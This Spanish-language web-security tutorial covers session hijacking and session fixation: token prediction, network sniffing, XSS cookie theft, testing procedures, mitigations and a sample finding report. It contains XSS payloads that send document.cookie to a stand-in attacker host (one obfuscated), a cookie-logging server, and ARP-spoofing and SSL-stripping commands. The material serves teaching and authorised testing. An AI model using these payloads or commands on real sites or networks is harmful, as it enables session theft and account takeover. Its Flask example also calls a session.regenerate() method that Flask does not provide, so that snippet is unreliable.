
# Session Hijacking & Session Fixation

Dos de los ataques más devastadores contra la gestión de sesiones son el **secuestro de sesión** (*Session Hijacking*) y la **fijación de sesión** (*Session Fixation*). Mientras que el primero permite a un atacante apoderarse de una sesión existente, el segundo fuerza a la víctima a usar una sesión controlada por el atacante. Ambos, si tienen éxito, comprometen completamente la cuenta del usuario sin necesidad de robar credenciales.

***

## <mark style="color:$primary;">Session Hijacking (Secuestro de sesión)</mark>

El secuestro de sesión ocurre cuando un atacante obtiene un Session ID válido perteneciente a otro usuario y lo utiliza para hacerse pasar por él. El atacante "roba" la sesión sin necesidad de conocer las credenciales originales.

### **Vectores de ataque comunes**

<table data-header-hidden><thead><tr><th width="211.22222900390625"></th><th></th><th></th></tr></thead><tbody><tr><td>Vector</td><td>Descripción</td><td>Mitigación clave</td></tr><tr><td><strong>Sniffing de red</strong></td><td>Capturar tráfico no cifrado en redes WiFi públicas o LAN</td><td>TLS obligatorio (HTTPS) + <code>Secure</code> flag</td></tr><tr><td><strong>Ataque Man-in-the-Middle (MITM)</strong></td><td>Interceptar y modificar tráfico entre cliente y servidor</td><td>TLS con HSTS + certificados válidos</td></tr><tr><td><strong>Cross-Site Scripting (XSS)</strong></td><td>Ejecutar JavaScript que lea <code>document.cookie</code> (si no hay <code>HttpOnly</code>)</td><td><code>HttpOnly</code> flag + sanitización de entrada</td></tr><tr><td><strong>Cross-Site Request Forgery (CSRF)</strong></td><td>Forzar peticiones autenticadas sin robar la cookie (distinto mecanismo)</td><td>Tokens CSRF + <code>SameSite</code> flag</td></tr><tr><td><strong>Ataque a la red local (ARP spoofing)</strong></td><td>Engañar a la puerta de enlace local para redirigir tráfico</td><td>Seguridad de capa 2 + HTTPS</td></tr><tr><td><strong>Acceso físico</strong></td><td>Obtener la cookie desde el navegador de un usuario desatendido</td><td>Cierre de sesión automático + pantalla de bloqueo</td></tr><tr><td><strong>Malware en el equipo</strong></td><td>Extraer cookies de archivos o memoria del navegador</td><td>Endpoint protection + rotación frecuente de tokens</td></tr></tbody></table>

***

### Session Hijacking: Adquisición de Tokens

El secuestro de sesión (*Session Hijacking*) comienza con un paso fundamental: **la adquisición del token de sesión**. Sin el token válido de la víctima, el atacante no puede hacerse pasar por ella. Existen múltiples técnicas para obtener este token, y conocerlas es esencial tanto para el atacante (en pruebas autorizadas) como para el defensor (para implementar las mitigaciones adecuadas).

Este capítulo se centra en las tres principales vías de adquisición de tokens: **Predicción de sesión**, **Sniffing de sesión** y **XSS**.

***

#### Técnicas de adquisición de tokens

<table data-header-hidden><thead><tr><th width="168.74078369140625"></th><th width="238.66668701171875"></th><th width="204.5186767578125"></th><th></th></tr></thead><tbody><tr><td>Técnica</td><td>Principio</td><td>Requisitos</td><td>Dificultad</td></tr><tr><td><strong>Session Prediction</strong></td><td>Adivinar o calcular el Session ID basándose en patrones débiles</td><td>Conocer el algoritmo de generación o muestras suficientes</td><td>Media-Alta</td></tr><tr><td><strong>Session Sniffing</strong></td><td>Capturar el token del tráfico de red (esnifado)</td><td>Acceso a la misma red que la víctima o punto de intercepción</td><td>Media</td></tr><tr><td><strong>XSS (Cross-Site Scripting)</strong></td><td>Ejecutar JavaScript en el navegador de la víctima para leer y enviar la cookie</td><td>Vulnerabilidad XSS en la aplicación</td><td>Media</td></tr><tr><td><strong>MITM (Man-in-the-Middle)</strong></td><td>Interceptar y modificar tráfico entre víctima y servidor</td><td>Control de un punto de la ruta de red</td><td>Alta</td></tr><tr><td><strong>Malware/Browser hijacking</strong></td><td>Extraer cookies directamente del equipo víctima</td><td>Infectar el equipo de la víctima</td><td>Alta</td></tr><tr><td><strong>Cross-Site Request Forgery</strong></td><td>Forzar acciones sin robar el token (no es adquisición real)</td><td>CSRF vulnerable</td><td>Baja (para robo)</td></tr></tbody></table>

Nos centraremos en las tres primeras por su prevalencia en aplicaciones web.

***

### 1️⃣ Session Prediction

La predicción de sesión ocurre cuando un atacante puede **adivinar o calcular** Session IDs válidos porque el algoritmo de generación es débil, predecible o contiene información del sistema (timestamps, direcciones IP, nombres de usuario, etc.).

No es necesario "robar" el token si puedes **generarlo tú mismo** con los mismos valores que usará la víctima.

#### Tipos de predictibilidad

<table data-header-hidden><thead><tr><th width="161.5926513671875"></th><th></th><th></th></tr></thead><tbody><tr><td>Tipo</td><td>Característica</td><td>Ejemplo</td></tr><tr><td><strong>Secuencial</strong></td><td>Los IDs incrementan de forma constante</td><td><code>1001</code>, <code>1002</code>, <code>1003</code>...</td></tr><tr><td><strong>Basado en timestamp</strong></td><td>El ID contiene una marca de tiempo (Unix epoch, fecha legible)</td><td><code>1734567890-abc</code></td></tr><tr><td><strong>Basado en username</strong></td><td>El ID incluye el nombre de usuario codificado</td><td><code>base64(juan_perez)</code></td></tr><tr><td><strong>Basado en IP</strong></td><td>El ID deriva de la dirección IP del cliente</td><td><code>hash(192.168.1.100)</code></td></tr><tr><td><strong>Entropía baja</strong></td><td>El espacio de posibles valores es pequeño (pocos bits)</td><td>IDs de 4 dígitos (10.000 combinaciones)</td></tr><tr><td><strong>PRNG débil</strong></td><td>Uso de generadores no criptográficos como <code>rand()</code></td><td><code>java.util.Random</code>, <code>Math.random()</code></td></tr></tbody></table>

#### **Análisis manual de patrones**

**Paso 1:** Captura una secuencia de Session IDs (al menos 20-30, mejor 50-100). Puedes hacerlo:

* Recargando la página de login múltiples veces (sin autenticarte).
* Creando y destruyendo sesiones mediante scripts.

**Paso 2:** Observa visualmente los IDs:

```bash
ID 1: a1b2c3d4e5f6
ID 2: a1b2c3d4e5f7  ← Incrementa al final
ID 3: a1b2c3d4e5f8  ← Patrón secuencial claro
```

```bash
ID 1: MTczNDU2Nzg5MDp1c2VyMQ==
ID 2: MTczNDU2NzkwNTp1c2VyMg==  ← Base64 decodificado: timestamp:usuario
```

**Paso 3:** Decodifica formatos comunes (Base64, hexadecimal, URL encoding) para ver la estructura interna.

#### **Uso de Burp Sequencer**

**Procedimiento completo:**

1. Envía la petición que **genera** el Session ID (no la que lo usa) al **Repeater**.
   * Normalmente es `GET /` o `GET /index.html` (sesión anónima).
   * Puede ser también el endpoint de login fallido.
2. Haz clic derecho sobre la petición → **Send to Sequencer**.
3. En la pestaña **Sequencer**, configura:
   * **Token location within response:** Normalmente en la cabecera `Set-Cookie` o en el cuerpo JSON.
   * **Number of tokens to obtain:** Recomendado 10.000 o 20.000 para análisis estadístico sólido.
4. Haz clic en **Start live capture**.
5. Una vez completado, ve a la pestaña **Analysis**.
   * Burp calculará la entropía estimada en bits.
   * **Bit score alto** (ej. >100 bits) → ✅ Aleatorio.
   * **Bit score bajo** (ej. <32 bits) → ❌ Predecible.
6. Inspecciona los **gráficos de caracteres**:
   * Si los caracteres tienen distribución uniforme → buena señal.
   * Si algunos caracteres aparecen mucho más que otros → patrón.

#### **Herramientas complementarias**

* **Custard** (para análisis de tokens a gran escala)
* **Toku** (framework de análisis de tokens)
* **Python scripts personalizados** para probar correlaciones temporales:

```python
import requests
import time

sessions = []
for i in range(100):
    resp = requests.get('https://target.com/')
    cookie = resp.cookies['sessionid']
    sessions.append((time.time(), cookie))
    
# Analizar correlación entre timestamp y valor del token
for ts, sid in sessions:
    print(f"{ts}: {sid}")
```

#### Caso real de predicción

**Escenario:** Aplicación que usa JWT con algoritmo `HS256` pero con una clave muy débil (`"secret"`). El atacante captura un token, lo decodifica en [jwt.io](https://jwt.io/), ve que contiene `{"user":"admin","exp":1734567890}`, modifica el usuario y firma con la clave adivinada.

**Lección:** No solo el ID debe ser aleatorio; los tokens con estructura (JWT) deben tener claves fuertes y algoritmos robustos.

***

### 2️⃣ Session Sniffing

El esnifado de sesión consiste en **capturar el tráfico de red** entre la víctima y el servidor para extraer el Session ID de las cabeceras HTTP. Una vez obtenido, el atacante lo utiliza para hacerse pasar por la víctima.

#### Requisitos para el esnifado

<table data-header-hidden><thead><tr><th width="172.25921630859375"></th><th></th></tr></thead><tbody><tr><td>Requisito</td><td>Explicación</td></tr><tr><td><strong>Acceso a la red</strong></td><td>El atacante debe estar en la misma red local (WiFi pública, Ethernet compartido) o tener capacidad de interceptar tráfico en algún punto de la ruta.</td></tr><tr><td><strong>Tráfico sin cifrar</strong></td><td>HTTP plano (sin TLS) → cookie en texto claro. HTTPS (con TLS) → requiere técnicas adicionales (MITM con certificados falsos o downgrade).</td></tr><tr><td><strong>Cookie sin flag Secure</strong></td><td>Si la cookie no tiene <code>Secure</code>, puede ser transmitida por HTTP aunque la página principal use HTTPS (recursos mixtos).</td></tr></tbody></table>

#### Técnicas de sniffing

**En redes WiFi públicas o LAN**

**Herramientas:**

* Wireshark (análisis visual)
* tcpdump (línea de comandos)
* BetterCAP (MITM y sniffing)
* Ettercap (ARP spoofing)

**Comando básico con tcpdump:**

```bash
sudo tcpdump -i eth0 -A -s 0 'tcp port 80' | grep -i "Cookie"
```

**En una red WiFi real:**

```bash
# Configurar monitor mode
sudo airmon-ng start wlan0

# Capturar tráfico HTTP en el canal correspondiente
sudo tcpdump -i wlan0mon -A -s 0 'tcp port 80' | grep -E "Cookie:|Set-Cookie:"
```

#### **Ataque ARP spoofing (Man-in-the-Middle local)**

El atacante engaña a la puerta de enlace y a la víctima para que todo el tráfico pase por él.

**Con BetterCAP:**

```bash
sudo bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; net.sniff on"
```

**Con Ettercap (modo texto):**

```bash
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//
```

Una vez interceptado el tráfico, se buscan cabeceras `Cookie:` y `Set-Cookie:`.

#### **Ataque de downgrade (HTTPS → HTTP)**

Algunas aplicaciones permiten conexiones HTTP aunque tengan HTTPS disponible. El atacante fuerza una conexión HTTP (SSL stripping).

**Con BetterCAP (HSTS bypass parcial):**

```bash
sudo bettercap -eval "set http.proxy.sslstrip true; http.proxy on"
```

**Herramienta específica:** `sslstrip` original (menos efectiva con HSTS moderno).

#### **Ataque a cookies sin flag Secure en sitios "seguros mixtos"**

Imagina:

* Página de login: `https://ejemplo.com/login` (HTTPS, cookie con `Secure` ✓)
* Imagen o recurso: `http://ejemplo.com/img/logo.png` (HTTP, **mismo dominio**)

En algunos navegadores antiguos o mal configurados, la cookie (incluso con `Secure`) puede ser transmitida por HTTP si pertenece al mismo dominio. Prueba a inyectar una etiqueta `<img>` que cargue un recurso HTTP y observa si la cookie viaja.

#### ¿Cómo testear la exposición al sniffing?

#### **Prueba 1: ¿Se usa HTTPS en toda la aplicación?**

```bash
curl -I http://ejemplo.com/login
```

Si devuelve 200 OK (en lugar de 301/302 a HTTPS), hay exposición.

**Prueba 2: Verificar flag Secure**\
Intercepta `Set-Cookie`:

```bash
Set-Cookie: sessionId=abc123; HttpOnly; Path=/
```

❌ Falta `Secure`. La cookie viajará también por HTTP.

#### **Prueba 3: Probar recursos mixtos**

1. Carga la página en HTTPS.
2. Inspecciona la consola del navegador: ¿hay advertencias de "mixed content"?
3. Si hay recursos HTTP, prueba si la cookie se filtra.

**Prueba 4: (Entorno controlado) Capturar tráfico real**\
En un laboratorio con dos máquinas virtuales (víctima y atacante) en la misma red, ejecuta el sniffing y verifica si capturas las cookies.

***

### 3️⃣ XSS (Cross-Site Scripting) para robo de cookies

El XSS para robo de cookies es la técnica más directa cuando existe una vulnerabilidad XSS en la aplicación. El atacante inyecta código JavaScript que se ejecuta en el navegador de la víctima, lee `document.cookie` y envía el contenido a un servidor controlado por el atacante.

#### Requisitos para el robo vía XSS

<table data-header-hidden><thead><tr><th width="249.29638671875"></th><th></th></tr></thead><tbody><tr><td>Requisito</td><td>Explicación</td></tr><tr><td><strong>Vulnerabilidad XSS</strong></td><td>Reflejado, almacenado o DOM-based, que permita ejecutar JavaScript.</td></tr><tr><td><strong>Cookie sin flag HttpOnly</strong></td><td>Si la cookie tiene <code>HttpOnly</code>, <code>document.cookie</code> no la mostrará.</td></tr><tr><td><strong>Acceso a servidor externo</strong></td><td>Para recibir los datos robados.</td></tr></tbody></table>

#### Payloads comunes para robo de cookies

**Payload básico (enviar a servidor externo)**

```html
<script>
document.location='http://atacante.com/steal?cookie='+document.cookie;
</script>
```

**Payload con fetch (más sigiloso)**

```html
<script>
fetch('http://atacante.com/steal', {
    method: 'POST',
    mode: 'no-cors',
    body: document.cookie
});
</script>
```

**Payload con Image (sin CORS)**

```html
<script>
new Image().src='http://atacante.com/steal?c='+encodeURIComponent(document.cookie);
</script>
```

**Payload ofuscado (para evadir filtros básicos)**

```html
<script>
eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,58,47,47,97,116,97,99,97,110,116,101,46,99,111,109,47,115,116,101,97,108,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101));
</script>
```

**Payload para WebSocket (menos detectable)**

```html
<script>
const ws = new WebSocket('ws://atacante.com:8080');
ws.onopen = () => ws.send(document.cookie);
</script>
```

#### Configuración del servidor atacante para recibir cookies

**Servidor HTTP básico con Python**

```bash
# Servidor simple que loguea todas las peticiones
python3 -m http.server 80
```

Luego en el payload se usa `http://IP_ATACANTE:80/steal?cookie=` + cookie.

**Servidor con logging personalizado (Python)**

```python
# server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class CookieHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if '/steal' in parsed.path:
            params = parse_qs(parsed.query)
            cookie = params.get('cookie', [''])[0]
            print(f"[!] Cookie robada: {cookie}")
            with open('stolen_cookies.txt', 'a') as f:
                f.write(f"{cookie}\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

HTTPServer(('0.0.0.0', 80), CookieHandler).serve_forever()
```

**netcat para escuchar conexiones simples**

```bash
nc -lvnp 80
```

(Esto mostrará las peticiones GET completas, útil para pruebas rápidas.)

**Servidor HTTPS para entorno real (con certificado autofirmado)**

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(self.headers)
        self.send_response(200)

httpd = HTTPServer(('0.0.0.0', 443), Handler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile='cert.pem', keyfile='key.pem', server_side=True)
httpd.serve_forever()
```

#### ¿Cómo testear la exposición al robo vía XSS?

**Prueba 1: Verificar flag HttpOnly**\
En consola del navegador:

```javascript
console.log(document.cookie);
```

Si ves la cookie de sesión aquí → ❌ Vulnerable a robo por XSS.

***

## <mark style="color:$primary;">Session Fixation (Fijación de sesión)</mark>

La fijación de sesión es una técnica en la que el atacante **establece un Session ID conocido** en el navegador de la víctima **antes de que se autentique**. Luego, cuando la víctima inicia sesión, el servidor (erróneamente) no regenera el Session ID, y el atacante, que conoce ese valor, puede usarlo para secuestrar la sesión.

### **Flujo del ataque**

```
┌─────────────┐                     ┌─────────────┐                    ┌─────────────┐
│   Atacante  │                     │   Servidor  │                    │   Víctima   │
└──────┬──────┘                     └──────┬──────┘                    └──────┬──────┘
       │                                   │                                  │
       │ 1. Obtiene Session ID (sin login) │                                  │
       │ ─────────────────────────────────>│                                  │
       │                                   │                                  │
       │ 2. Devuelve sessionId=XYZ         │                                  │
       │<───────────────────────────────── |                                  │
       │                                   │                                  │
       │ 3. Prepara enlace malicioso:      │                                  │
       │    https://ejemplo.com/login?sid=XYZ                                 │ 
       │                                   │                                  │
       │                                   │ 4. Víctima hace clic             │
       │                                   │<─────────────────────────────────│
       │                                   │                                  │
       │                                   │ 5. Inicia sesión (el servidor    │
       │                                   │    NO regenera el ID)            │
       │                                   │                                  │
       │ 6. Usa sessionId=XYZ para acceder │                                  │
       │    a la cuenta de la víctima      │                                  │
       │ ─────────────────────────────────>│                                  │
       │                                   │                                  │
```

### **¿Cómo testear la fijación de sesión?**

#### **Prueba estándar de regeneración**

1. **Sin autenticar**, obtén un Session ID. Puedes hacerlo:
   * Visitando cualquier página pública (muchas apps asignan una cookie anónima).
   * Solicitando un endpoint como `/` o `/index.html`.
2. **Registra el Session ID** (ej. `ABC123`).
3. **Inicia sesión** normalmente (con credenciales válidas).
4. **Observa la cookie después del login**:
   * Si cambia (ej. `ABC123` → `XYZ789`): ✅ Bueno, no es vulnerable.
   * Si sigue siendo `ABC123`: ❌ Vulnerable a fijación de sesión.

#### **Variante vía URL (inyección en la query string)**

Algunas aplicaciones aceptan Session IDs vía URL (pésima práctica). Prueba:

```
https://ejemplo.com/?sessionid=XYZ123
```

Si la aplicación toma ese valor y lo usa como cookie, es vulnerable.

#### **Variante vía formulario** (POST o parámetro oculto)

```bash
<input type="hidden" name="sessionId" value="XYZ123">
```

Si el servidor acepta el Session ID desde un campo de formulario, también es vulnerable.

#### **Variante vía cabecera `Cookie` manipulado**

```http
GET / HTTP/1.1
Host: ejemplo.com
Cookie: sessionId=XYZ123
```

Si el servidor respeta la cookie establecida antes del login y no la regenera, es vulnerable.

#### **Prueba avanzada: regeneración condicional**

Algunas aplicaciones solo regeneran el Session ID si cambia el nivel de privilegios. Prueba:

1. Obtén un Session ID como usuario anónimo.
2. Inicia sesión como usuario normal (rol user).
3. Luego, accede a una función de administrador (elevación de rol).
4. Verifica si el ID cambió en cada paso.

***

#### 🧪 Ejecución práctica de ataques (entorno autorizado)

> ⚠️ **ADVERTENCIA** – Estos procedimientos solo deben realizarse en entornos donde tengas autorización explícita y por escrito (fase Pre-Engagement). Ejecutar estos ataques sin permiso es ilegal.

**Simulación de Session Hijacking con XSS (entorno de pruebas)**

**Preparación:**

* Una aplicación vulnerable de pruebas (ej. OWASP WebGoat, DVWA, Juice Shop)
* Burp Suite Community/Professional
* Navegador con consola de desarrollador

**Ejecución en laboratorio:**

1. Encuentra un punto de inyección XSS reflejado o almacenado.
2. Inyecta el payload que lee `document.cookie`:

html

```
<script>
    fetch('http://localhost:8080/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
```

3. Configura un listener simple (netcat o un servidor Python):

bash

```
python3 -m http.server 8080
```

4. Cuando la víctima visita la página, recibirás la cookie.

**Simulación de Session Fixation en laboratorio**

**Escenario:**\
Aplicación vulnerable donde el Session ID no se regenera en login.

**Pasos:**

1. Abre un navegador limpio (o sesión de incógnito).
2. Accede a la aplicación y captura el Session ID (sin login).
3. Guarda ese ID (ej. `SESSION=abc123`).
4. Abre otro navegador (victima simulada).
5. Inyecta manualmente el Session ID usando una extensión como EditThisCookie.
6. Inicia sesión en la aplicación desde el navegador víctima.
7. En el navegador atacante, usa el mismo Session ID y accede a un endpoint autenticado.
8. Si puedes ver datos de la víctima, la vulnerabilidad está confirmada.

***

## <mark style="color:$primary;">Mitigaciones y buenas prácticas</mark>

### **Para Session Hijacking**

<table data-header-hidden><thead><tr><th width="234.4814453125"></th><th></th></tr></thead><tbody><tr><td>Medida</td><td>Implementación</td></tr><tr><td><strong>TLS obligatorio</strong></td><td>Redirigir todo HTTP a HTTPS; usar HSTS.</td></tr><tr><td><strong>Secure flag</strong></td><td><code>Set-Cookie: sessionId=...; Secure</code></td></tr><tr><td><strong>HttpOnly flag</strong></td><td><code>Set-Cookie: sessionId=...; HttpOnly</code></td></tr><tr><td><strong>SameSite flag</strong></td><td><code>SameSite=Lax</code> o <code>SameSite=Strict</code></td></tr><tr><td><strong>Vinculación de sesión</strong></td><td>Añadir atributos <code>ip_address</code> y <code>user_agent</code> al objeto de sesión y validarlos en cada petición.</td></tr><tr><td><strong>Rotación periódica</strong></td><td>Renovar Session ID cada cierto tiempo (cada hora o en cambios de actividad).</td></tr><tr><td><strong>Detección de anomalías</strong></td><td>Alertar si una sesión se usa desde dos IPs geográficamente distantes.</td></tr></tbody></table>

### **Para Session Fixation**

<table data-header-hidden><thead><tr><th width="235.96295166015625"></th><th></th></tr></thead><tbody><tr><td>Medida</td><td>Implementación</td></tr><tr><td><strong>Regeneración post-autenticación</strong></td><td>Siempre generar un nuevo Session ID después de cualquier login exitoso.</td></tr><tr><td><strong>Regeneración en cambio de rol</strong></td><td>Cambiar Session ID cuando un usuario cambia su nivel de privilegios.</td></tr><tr><td><strong>No aceptar IDs vía URL</strong></td><td>Rechazar explícitamente Session IDs en query strings o parámetros POST.</td></tr><tr><td><strong>Invalidación de IDs pre-autenticación</strong></td><td>Eliminar cualquier sesión anónima existente al iniciar login.</td></tr><tr><td><strong>Tiempo de vida corto para sesiones anónimas</strong></td><td>Que las sesiones sin autenticar expiren rápidamente (minutos).</td></tr></tbody></table>

### **Ejemplo de regeneración correcta en backend**

#### **Python/Flask**

```python
from flask import session, request

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    if authenticate(username, password):
        session.clear()           # Elimina cualquier sesión existente
        session['user_id'] = user.id
        session.regenerate()      # Genera nuevo Session ID (si el framework lo soporta)
        return redirect('/dashboard')
```

#### **Node.js/Express (con express-session)**

```javascript
app.post('/login', (req, res) => {
    if (authenticate(req.body.username, req.body.password)) {
        req.session.regenerate((err) => {
            if (err) return res.status(500).send('Error');
            req.session.userId = user.id;
            res.redirect('/dashboard');
        });
    }
});
```

#### **Java/Spring Security**

```java
@Override
protected void configure(HttpSecurity http) throws Exception {
    http
        .sessionManagement()
        .sessionFixation().newSession()  // Migra la sesión, genera nuevo ID
        .and()
        // ... resto de configuraciones
}
```

***

## <mark style="color:$primary;">Checklist de pruebas para Hijacking & Fixation</mark>

<table data-header-hidden><thead><tr><th width="62.2962646484375"></th><th width="297.74072265625"></th><th width="254.6666259765625"></th><th></th></tr></thead><tbody><tr><td>#</td><td>Prueba</td><td>Herramienta</td><td>Severidad</td></tr><tr><td>1</td><td>Verificar flags <code>Secure</code> y <code>HttpOnly</code> en todas las cookies de sesión</td><td>Burp (Target > Site map)</td><td>Crítica</td></tr><tr><td>2</td><td>Comprobar si el session ID cambia tras login</td><td>Burp Repeater</td><td>Alta</td></tr><tr><td>3</td><td>Comprobar si el session ID cambia tras cambio de rol</td><td>Burp Repeater + navegador</td><td>Alta</td></tr><tr><td>4</td><td>Comprobar si se aceptan session IDs vía URL</td><td>Modificar URL manualmente</td><td>Alta</td></tr><tr><td>5</td><td>Comprobar si se aceptan session IDs vía parámetros POST</td><td>Burp Repeater</td><td>Media</td></tr><tr><td>6</td><td>Comprobar si hay vinculación IP (sesión vs. dirección IP)</td><td>Cambiar cabecera <code>X-Forwarded-For</code></td><td>Media</td></tr><tr><td>7</td><td>Comprobar si la sesión sobrevive a logout</td><td>Reutilizar misma cookie tras logout</td><td>Alta</td></tr><tr><td>8</td><td>Comprobar si la exposición de <code>document.cookie</code> muestra la cookie de sesión</td><td>Consola navegador</td><td>Crítica</td></tr><tr><td>9</td><td>Comprobar si la cookie tiene <code>SameSite</code> configurado</td><td>Inspección de <code>Set-Cookie</code></td><td>Media</td></tr><tr><td>10</td><td>Probar regeneración en cada login, incluso con credenciales inválidas (para sesiones anónimas)</td><td>Múltiples intentos de login fallido</td><td>Baja-Media</td></tr></tbody></table>

***

#### 📊 Ejemplo práctico: Reporte de hallazgo

**Hallazgo:** Session Fixation en endpoint `/login`

**Severidad:** Alta (CVSS 7.5)

**Descripción:** La aplicación no regenera el Session ID después de un login exitoso. Un atacante puede fijar un Session ID conocido antes de la autenticación y luego secuestrar la sesión de la víctima.

**Paso a paso para reproducir:**

1. Obtener un Session ID sin autenticar: `GET /` → Respuesta `Set-Cookie: JSESSIONID=A1B2C3`
2. Iniciar sesión con credenciales válidas usando el mismo Session ID (inyectado manualmente).
3. Observar que el Session ID permanece como `A1B2C3` después del login.
4. Desde otro equipo (o ventana de incógnito), usar el mismo `JSESSIONID=A1B2C3` para acceder a datos autenticados.

**Evidencia:** Captura de pantalla de las peticiones y respuestas mostrando el mismo ID antes y después del login.

**Recomendación:** Implementar `request.getSession().invalidate()` seguido de `request.getSession(true)` al inicio del método de login, o usar el mecanismo `sessionFixation().newSession()` de Spring Security.

**Referencia OWASP:** [Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)

***

## <mark style="color:$primary;">Referencias y recursos oficiales</mark>

* [OWASP: Session Hijacking](https://owasp.org/www-community/attacks/Session_hijacking_attack)
* [OWASP: Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)
* [PortSwigger: Session Management Cheat Sheet](https://portswigger.net/web-security/session-management)
* [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)
* [CWE-488: Exposure of Session ID in URL](https://cwe.mitre.org/data/definitions/488.html)
